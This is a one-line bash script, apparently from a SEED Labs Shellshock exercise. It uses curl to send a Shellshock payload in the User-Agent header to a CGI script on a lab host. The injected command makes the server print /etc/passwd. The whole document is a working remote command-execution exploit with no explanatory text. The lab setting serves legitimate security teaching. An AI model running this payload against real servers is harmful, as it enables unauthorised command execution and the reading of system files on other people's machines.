#!/bin/bash

curl -A " () { cat; }; echo; /bin/cat /etc/passwd;" www.seedlab-shellshock.com/cgi-bin/vul.cgi
